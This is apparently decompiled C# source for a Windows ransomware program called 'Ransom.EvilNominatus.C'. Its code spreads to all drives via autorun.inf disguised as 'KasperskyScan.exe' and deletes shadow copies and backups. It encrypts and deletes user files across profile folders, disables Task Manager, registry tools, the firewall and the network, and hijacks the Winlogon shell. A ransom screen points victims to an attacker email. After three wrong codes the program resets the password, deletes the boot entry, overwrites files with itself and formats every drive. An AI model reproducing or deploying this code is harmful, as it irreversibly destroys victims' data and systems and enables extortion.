using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TRS;

public class MainForm : Form
{
	public string getDirX = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	public int live = 3;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Button button1;

	private Label label3;

	private RichTextBox richTextBox1;

	private Label label2;

	private Label label1;

	public static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	public void EncryptDisks(string DISKLOCATION)
	{
		try
		{
			string[] files = Directory.GetFiles(DISKLOCATION + "\\", "*.*", SearchOption.AllDirectories);
			for (int i = 0; i < files.Length; i = checked(i + 1))
			{
				try
				{
					EncryptIT(files[i]);
					File.Delete(files[i]);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public MainForm()
	{
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		checked
		{
			try
			{
				runCommand("echo ^[autorun^] >autorun.inf");
				runCommand("echo ^open^=KasperskyScan^.exe >>autorun.inf");
				runCommand("echo ^execute=^KasperskyScan^.exe >>autorun.inf");
				string text = "KasperskyScan.exe";
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					try
					{
						File.Copy("autorun.inf", driveInfo.ToString());
						File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + text);
					}
					catch
					{
					}
				}
				Process.EnterDebugMode();
				runCommand("vssadmin delete shadows /all /quiet && wmic shadowcopy delete");
				MessageBox.Show("Loading please wait.... don't turn on the antivirus");
				drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo2 in drives)
				{
					try
					{
						string[] files = Directory.GetFiles(string.Concat(driveInfo2, "\\"), "*.bak", SearchOption.AllDirectories);
						for (int j = 0; j < files.Length; j++)
						{
							try
							{
								File.Delete(files[j]);
							}
							catch
							{
							}
						}
						string[] files2 = Directory.GetFiles(string.Concat(driveInfo2, "\\"), "*.*", SearchOption.AllDirectories);
						for (int j = 0; j < files2.Length; j++)
						{
							try
							{
								EncryptIT(files2[j]);
								File.Delete(files2[j]);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
					EncryptDisks(driveInfo2.ToString());
				}
				Thread.Sleep(90000);
				runCommand("taskkill /im taskmgr.exe /f");
				runCommand("assoc .png=NotSoCleverBotFile");
				runCommand("assoc .vbs=NotSoCleverBotFile");
				runCommand("assoc .html=NotSoCleverBotFile");
				runCommand("assoc .bat=NotSoCleverBotFile");
				runCommand("assoc .jpn=EncryptedFile");
				runCommand("assoc .js=exe1file");
				runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
				runCommand("ipconfig /release");
				runCommand("net stop Windows Firewall");
				runCommand("net stop Network Connections");
				using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"))
				{
					try
					{
						registryKey.SetValue("Shell", Application.get_ExecutablePath(), RegistryValueKind.String);
					}
					catch
					{
					}
				}
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				Directory.GetFiles(folderPath);
				Directory.GetDirectories(folderPath);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files3 = Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories);
				string[] directories = Directory.GetDirectories(folderPath2);
				for (int k = 0; k < directories.Length; k++)
				{
					try
					{
						MakeThemDIE(directories[k]);
						EncryptIT(directories[k]);
					}
					catch
					{
					}
				}
				for (int l = 0; l < files3.Length; l++)
				{
					try
					{
						EncryptIT(files3[l]);
						File.Delete(files3[l]);
					}
					catch
					{
					}
				}
				try
				{
					string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles);
					string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms);
					string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					encryptDirectory(folderPath3);
					encryptDirectory(folderPath5);
					encryptDirectory(folderPath4);
					encryptDirectory(folderPath6);
					encryptDirectory(folderPath7);
					FinalPower(folderPath3);
					FinalPower(folderPath5);
					FinalPower(folderPath4);
					FinalPower(folderPath6);
					FinalPower(folderPath7);
					string text2 = "C:\\Users\\";
					string userName = Environment.UserName;
					string location = text2 + userName + "\\Desktop";
					string location2 = text2 + userName + "\\Links";
					string location3 = text2 + userName + "\\Contacts";
					string location4 = text2 + userName + "\\Desktop";
					string location5 = text2 + userName + "\\Documents";
					string location6 = text2 + userName + "\\Downloads";
					string location7 = text2 + userName + "\\Pictures";
					string location8 = text2 + userName + "\\Music";
					string location9 = text2 + userName + "\\OneDrive";
					string location10 = text2 + userName + "\\Saved Games";
					string location11 = text2 + userName + "\\Favorites";
					string location12 = text2 + userName + "\\Searches";
					string location13 = text2 + userName + "\\Videos";
					encryptDirectory(location);
					encryptDirectory(location2);
					encryptDirectory(location3);
					encryptDirectory(location4);
					encryptDirectory(location5);
					encryptDirectory(location6);
					encryptDirectory(location7);
					encryptDirectory(location8);
					encryptDirectory(location9);
					encryptDirectory(location10);
					encryptDirectory(location11);
					encryptDirectory(location12);
					encryptDirectory(location13);
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
					encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
					string folderPath8 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
					string text3 = Path.Combine(environmentVariable, "Downloads");
					string[] files4 = Directory.GetFiles(folderPath8 + "\\", "*", SearchOption.AllDirectories);
					string[] files5 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
					for (int j = 0; j < files4.Length; j++)
					{
						try
						{
							EncryptIT(files4[j]);
							File.Delete(files4[j]);
						}
						catch
						{
						}
					}
					for (int j = 0; j < files5.Length; j++)
					{
						try
						{
							EncryptIT(files4[j]);
							File.Delete(files4[j]);
						}
						catch
						{
						}
					}
					string[] files6 = Directory.GetFiles(folderPath7 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files7 = Directory.GetFiles(folderPath6 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files8 = Directory.GetFiles(folderPath4 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files9 = Directory.GetFiles(folderPath5 + "\\", "*.*", SearchOption.AllDirectories);
					string[] files10 = Directory.GetFiles(folderPath3 + "\\", "*.*", SearchOption.AllDirectories);
					for (int m = 0; m < files6.Length; m++)
					{
						try
						{
							EncryptIT(files6[m]);
							File.Delete(files6[m]);
						}
						catch
						{
						}
					}
					for (int n = 0; n < files7.Length; n++)
					{
						try
						{
							EncryptIT(files7[n]);
							File.Delete(files7[n]);
						}
						catch
						{
						}
					}
					for (int num = 0; num < files8.Length; num++)
					{
						try
						{
							EncryptIT(files8[num]);
							File.Delete(files8[num]);
						}
						catch
						{
						}
					}
					for (int num2 = 0; num2 < files9.Length; num2++)
					{
						try
						{
							EncryptIT(files9[num2]);
							File.Delete(files9[num2]);
						}
						catch
						{
						}
					}
					for (int num3 = 0; num3 < files10.Length; num3++)
					{
						try
						{
							EncryptIT(files9[num3]);
							File.Delete(files9[num3]);
						}
						catch
						{
						}
					}
					try
					{
						encryptDirectory(getDirX);
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
	}

	private void Label1Click(object sender, EventArgs e)
	{
	}

	private void Button1Click(object sender, EventArgs e)
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)richTextBox1).get_Text() == "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK")
		{
			try
			{
				runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f");
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
				runCommand("explorer.exe");
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				Directory.GetFiles(folderPath + "\\", "*.*", SearchOption.AllDirectories);
				MessageBox.Show("ransomware removed from your Computer but files still encrypted you can now contact attacker Bkhtyaryrwzbh@gmail.com to get the decrypter");
				((Form)this).Close();
				return;
			}
			catch
			{
				return;
			}
		}
		if (!(((Control)richTextBox1).get_Text() == ((Control)richTextBox1).get_Text()))
		{
			return;
		}
		checked
		{
			if (live == 0)
			{
				try
				{
					((Control)this).Hide();
					RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
					registryKey2.SetValue("Shell", "0", RegistryValueKind.String);
					runCommand("net users %username% 912983");
					runCommand("bcdedit /delete {current}");
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string[] files = Directory.GetFiles(folderPath2, "*.*", SearchOption.AllDirectories);
					for (int i = 0; i < files.Length; i++)
					{
						Attack1(files[i]);
						File.Delete(files[i]);
					}
					runCommand("assoc .vbs=INFECTEDFILE && assoc .html=INFECTEDFILE");
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo in drives)
					{
						Damage(driveInfo.ToString());
					}
					runCommand("msg * Welcome to my Nightmare");
					Thread.Sleep(30);
					runCommand("taskkill /im wininit.exe /f");
					return;
				}
				catch
				{
					return;
				}
			}
			live--;
			MessageBox.Show("Wrong! you have " + live + " chance!");
		}
	}

	public void MakeThemDIE(string Path1)
	{
		try
		{
			_ = Environment.UserName;
		}
		catch
		{
		}
	}

	public void Attack1(string FName)
	{
		try
		{
			byte[] bytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
			File.WriteAllBytes(FName, bytes);
		}
		catch
		{
		}
	}

	public void Damage(string DriveNameToFormat)
	{
		try
		{
			string commands = "format " + DriveNameToFormat + " /FS:NTFS /X /Q /y";
			runCommand(commands);
		}
		catch
		{
		}
	}

	public void MakeThemAlive(string PathN)
	{
	}

	public void encryptDirectory(string location)
	{
		checked
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				string[] directories = Directory.GetDirectories(location);
				for (int i = 0; i < files.Length; i++)
				{
					EncryptIT(files[i]);
					File.Delete(files[i]);
				}
				for (int i = 0; i < directories.Length; i++)
				{
					encryptDirectory(directories[i]);
					Directory.Delete(directories[i]);
				}
			}
			catch
			{
			}
		}
	}

	public void FinalPower(string locationPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(locationPath);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.*");
			foreach (FileInfo fileInfo in files)
			{
				EncryptIT(fileInfo.FullName);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				encryptDirectory(directoryInfo2.FullName);
			}
		}
		catch (Exception)
		{
		}
	}

	public void EncryptIT(string inputFile)
	{
		try
		{
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			string s = "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK";
			byte[] bytes = unicodeEncoding.GetBytes(s);
			string text = inputFile + "-Locked";
			string path = text;
			using (FileStream stream = new FileStream(path, FileMode.Create))
			{
				using AesManaged aesManaged = new AesManaged();
				using CryptoStream cryptoStream = new CryptoStream(stream, aesManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
				using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
				aesManaged.KeySize = 256;
				aesManaged.BlockSize = 128;
				aesManaged.Key = bytes;
				aesManaged.IV = bytes;
				aesManaged.Mode = CipherMode.CBC;
				int num;
				while ((num = fileStream.ReadByte()) != -1)
				{
					cryptoStream.WriteByte(checked((byte)num));
				}
			}
			File.Delete(inputFile + ".*");
		}
		catch
		{
		}
	}

	public void GetSystemFolder()
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Windows);
	}

	public void InfectTheFile(string FileNAME1)
	{
		try
		{
			byte[] bytes = File.ReadAllBytes(Application.get_ExecutablePath());
			File.WriteAllBytes(FileNAME1, bytes);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fe: Expected O, but got Unknown
		//IL_031c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0383: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Expected O, but got Unknown
		//IL_03ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a8: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		richTextBox1 = new RichTextBox();
		label3 = new Label();
		button1 = new Button();
		label2 = new Label();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_BackColor(Color.Transparent);
		label1.set_FlatStyle((FlatStyle)0);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.DarkRed);
		((Control)label1).set_Location(new Point(16, 11));
		((Control)label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(931, 54));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("CryptoVirus Detected!  Ransom.NominatusStrike");
		((Control)label1).add_Click((EventHandler)Label1Click);
		((Control)richTextBox1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(80, 340));
		((Control)richTextBox1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(409, 25));
		((Control)richTextBox1).set_TabIndex(2);
		((Control)richTextBox1).set_Text("");
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 9.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(13, 340));
		((Control)label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(77, 30));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("Code:");
		((ButtonBase)button1).set_FlatStyle((FlatStyle)3);
		((Control)button1).set_Location(new Point(497, 342));
		((Control)button1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(188, 28));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("GO AWAY!!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)Button1Click);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 12.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(20, 59));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(896, 242));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(924, 59));
		((Control)pictureBox1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(153, 148));
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.AppWorkspace);
		((Form)this).set_ClientSize(new Size(1151, 439));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Ransom.EvilNominatus.C");
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
